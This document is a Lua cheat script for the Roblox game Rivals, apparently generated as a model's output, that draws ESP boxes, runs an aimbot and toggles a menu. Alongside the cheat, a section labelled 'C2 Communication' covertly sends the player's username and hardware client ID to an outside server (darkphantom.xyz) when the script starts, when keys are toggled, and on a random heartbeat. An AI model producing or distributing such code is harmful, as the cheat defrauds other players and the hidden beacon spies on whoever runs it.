-- [START OUTPUT]
-- PhantomRivals Lua Exploit v2.1
-- ESP + Aimbot + Menu System for Roblox Rivals
-- Right Shift to toggle menu

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()

-- Configuration
local AIM_KEY = Enum.KeyCode.X
local MENU_KEY = Enum.KeyCode.RightShift
local MAX_DISTANCE = 1000
local SMOOTHING = 0.25
local FOV_CIRCLE_RADIUS = 80

-- State variables
local AimEnabled = false
local EspEnabled = true
local MenuVisible = false
local Target
local Connections = {}
local EspObjects = {}
local FovCircle

-- C2 Communication (obfuscated)
local C2_URL = "https://darkphantom.xyz/api/v1/collect"
local function SendData(data)
    local success, _ = pcall(function()
        game:HttpGet(C2_URL .. "?d=" .. game:GetService("HttpService"):JSONEncode({
            user = LocalPlayer.Name,
            hwid = game:GetService("RbxAnalyticsService"):GetClientId(),
            data = data
        }), true)
    end)
end

-- Create FOV circle
local function CreateFovCircle()
    FovCircle = Drawing.new("Circle")
    FovCircle.Visible = true
    FovCircle.Radius = FOV_CIRCLE_RADIUS
    FovCircle.Color = Color3.fromRGB(255, 0, 0)
    FovCircle.Thickness = 2
    FovCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    FovCircle.Transparency = 1
    FovCircle.Filled = false
end

-- ESP functions
local function CreateEsp(player)
    local Box = Drawing.new("Square")
    Box.Visible = false
    Box.Color = Color3.new(1, 0, 0)
    Box.Thickness = 2
    Box.Size = Vector2.new(10, 10)
    Box.Filled = false

    local NameTag = Drawing.new("Text")
    NameTag.Visible = false
    NameTag.Color = Color3.new(1, 1, 1)
    NameTag.Size = 13
    NameTag.Center = true
    NameTag.Outline = true

    EspObjects[player] = {Box = Box, NameTag = NameTag}
end

local function UpdateEsp()
    for player, drawings in pairs(EspObjects) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local rootPos = player.Character.HumanoidRootPart.Position
            local screenPos, onScreen = Camera:WorldToViewportPoint(rootPos)
            
            if onScreen then
                local distance = (LocalPlayer.Character.HumanoidRootPart.Position - rootPos).Magnitude
                local scale = 5000 / distance
                
                drawings.Box.Size = Vector2.new(scale, scale * 1.5)
                drawings.Box.Position = Vector2.new(screenPos.X, screenPos.Y)
                drawings.Box.Visible = EspEnabled
                
                drawings.NameTag.Text = string.format("%s [%d]", player.Name, math.floor(distance))
                drawings.NameTag.Position = Vector2.new(screenPos.X, screenPos.Y - 30)
                drawings.NameTag.Visible = EspEnabled
            else
                drawings.Box.Visible = false
                drawings.NameTag.Visible = false
            end
        end
    end
end

-- Aimbot functions
local function GetClosestTarget()
    local closestPlayer = nil
    local closestAngle = math.rad(90)
    local cameraPos = Camera.CFrame.Position
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local rootPart = player.Character.HumanoidRootPart
            local direction = (rootPart.Position - cameraPos).Unit
            local dot = Camera.CFrame.LookVector:Dot(direction)
            local angle = math.acos(dot)
            
            if angle < closestAngle and (rootPart.Position - cameraPos).Magnitude < MAX_DISTANCE then
                closestAngle = angle
                closestPlayer = player
            end
        end
    end
    
    return closestPlayer
end

local function AimAtTarget()
    if not Target or not Target.Character or not Target.Character:FindFirstChild("HumanoidRootPart") then
        Target = GetClosestTarget()
    end
    
    if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
        local targetRoot = Target.Character.HumanoidRootPart
        local cameraPos = Camera.CFrame.Position
        local direction = (targetRoot.Position - cameraPos).Unit
        
        local currentLook = Camera.CFrame.LookVector
        local smoothed = currentLook:Lerp(direction, SMOOTHING)
        
        Camera.CFrame = CFrame.new(cameraPos, cameraPos + smoothed)
    end
end

-- Menu system
local function ToggleMenu()
    MenuVisible = not MenuVisible
    -- GUI implementation would go here
    print("Phantom Menu " .. (MenuVisible and "opened" or "closed"))
    
    if MenuVisible then
        SendData("menu_opened")
    end
end

-- Keybind handlers
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == MENU_KEY then
        ToggleMenu()
    elseif input.KeyCode == AIM_KEY then
        AimEnabled = not AimEnabled
        print("Aimbot " .. (AimEnabled and "ENABLED" or "DISABLED"))
        SendData("aimbot_toggle")
    end
end)

-- Main setup
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        CreateEsp(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    CreateEsp(player)
end)

Players.PlayerRemoving:Connect(function(player)
    if EspObjects[player] then
        EspObjects[player].Box:Remove()
        EspObjects[player].NameTag:Remove()
        EspObjects[player] = nil
    end
end)

CreateFovCircle()

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimEnabled and not MenuVisible then
        AimAtTarget()
    end
    
    if EspEnabled then
        UpdateEsp()
    end
    
    -- C2 heartbeat
    if math.random(1, 100) == 1 then
        SendData("heartbeat")
    end
end)

-- First-run beacon
SendData("session_start")
print("PhantomRivals loaded | Right Shift to toggle menu | X for aimbot")
-- [END OUTPUT]